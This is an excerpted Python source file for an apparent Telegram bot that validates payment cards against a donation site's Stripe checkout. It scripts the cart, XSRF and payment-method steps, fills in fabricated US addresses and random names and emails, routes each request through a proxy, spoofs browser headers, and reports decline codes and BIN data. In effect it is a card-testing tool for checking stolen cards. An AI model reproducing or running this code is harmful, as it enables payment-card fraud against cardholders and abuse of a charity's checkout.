...
US_CITIES = [("Fort Lauderdale", "FL", "33316"), ("Miami", "FL", "33101"), ("Orlando", "FL", "32801"), ("Houston", "TX", "77001"), ("Dallas", "TX", "75201"), ("Los Angeles", "CA", "90001"), ("New York", "NY", "10001"), ("Chicago", "IL", "60601"), ("Phoenix", "AZ", "85001")]
US_STREETS = ["1900 Southeast 15th Street", "1234 Main Street", "5678 Oak Avenue", "9012 Palm Boulevard", "3456 Maple Drive", "7890 Cedar Lane", "2345 Elm Street", "6789 Pine Road"]
...
async def step1_get_cart_token(session, proxy):
    headers = {
        ...
        'origin': BASE_URL, 'referer': f'{BASE_URL}/donate-now', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
...
async def step1b_get_xsrf_and_total(session, cart_token, proxy):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'referer': f'{BASE_URL}/donate-now'}
...
async def step2_create_pm(session, card, full_name, email, address_info, proxy):
    cn = card["card_number"]
    ...
    data = {
        ...
        'billing_details[address][line1]': street, 'billing_details[address][postal_code]': zip_code,
        'billing_details[address][state]': state, 'billing_details[name]': full_name,
        'billing_details[email]': email, 'type': 'card', 'card[number]': cn_fmt,
        'card[cvc]': card['cvv'], 'card[exp_year]': card['year'], 'card[exp_month]': card['month'],
        'guid': str(uuid.uuid4()).replace('-', '') + '10e650', 'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()), 'key': STRIPE_PK, '_stripe_account': STRIPE_ACCOUNT
    }
    ...
    if "error" in rj:
        err = rj["error"]
        return None, f"DECLINED | {err.get('decline_code', err.get('code', 'ERROR'))}"
...
async def step3_submit(session, cart_token, pm, full_name, email, crumb, xsrf, address_info, grand_total, proxy):
    headers = {
        'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
        'origin': BASE_URL, 'referer': f'{BASE_URL}/checkout?cartToken={cart_token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    ...
    payload = {
        'email': email, 'subscribeToList': False, 'createNewUser': False, 'newUserPassword': None,
        'saveShippingAddress': False, 'makeDefaultShippingAddress': False, 'customFormData': None, 'shippingAddressId': None,
        ...
        'shippingAddress': {'id': '', 'firstName': '', 'lastName': '', 'line1': '', 'line2': '', 'city': city, 'region': state, 'postalCode': '', 'country': '', 'phoneNumber': ''},
    ...
    if ss == "ORDER_CONFIRMED":
        ...
        if ft: return "DECLINED", ft
        return "DECLINED", str(rj)[:100]
...
async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        async with aiohttp.ClientSession(timeout=timeout) as session:
            ...
            full_name = f"{fn} {ln}"
            email = f"{fn.lower()}{ln.lower()}{random.randint(1, 9999)}@{random.choice(EMAIL_DOMAINS)}"
        ...
        # Fetch BIN Info concurrently while processing
